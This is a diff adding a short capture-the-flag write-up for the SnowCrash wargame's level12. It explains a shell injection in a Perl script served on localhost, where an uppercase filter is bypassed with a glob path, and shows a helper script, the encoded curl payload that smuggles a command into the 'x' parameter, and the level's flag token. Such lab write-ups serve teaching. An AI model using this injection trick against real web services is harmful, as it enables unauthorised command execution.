@@ -1,0 +1,27 @@
+# in this level we have a perl script servable through localhost:4646 and runs with flag12's privileges
+# the script is vulnerable to SHELL injection through HTTP parameter 'x'
+
+@output = `egrep "^$xx" /tmp/xd 2>&1`;
+
+# in the line of code above, our input parameter's value is $xx
+# but there's an obstacle: all lowercase characters in $xx gets capitalized
+# so thinking of injecting $(getflag>/tmp/flag) won't work, we can overcome the command part by adding an alias: alias GETFLAG=getflag
+# but what about the /tmp/flag part?
+# the solution is to have a script named /tmp/SCRIPT for example
+# and to inject $(/*/SCRIPT), to prevent having 'tmp' capitalized, /* will be expanded to all entries of / -> /tmp/SCRIPT will be executed
+
+level12@SnowCrash:~$ cat /tmp/SCRIPT
+#!/bin/bash
+
+getflag > /tmp/flag
+
+# now let's try the solution:
+
+level12@SnowCrash:~$ curl "http://localhost:4646?x=%24%28/*/SCRIPT%29&y=value"
+.level12@SnowCrash:~$ cat /tmp/flag
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
+level12@SnowCrash:~$ su level13
+Password: 
+level13@SnowCrash:~$
+
+# level13 unlocked
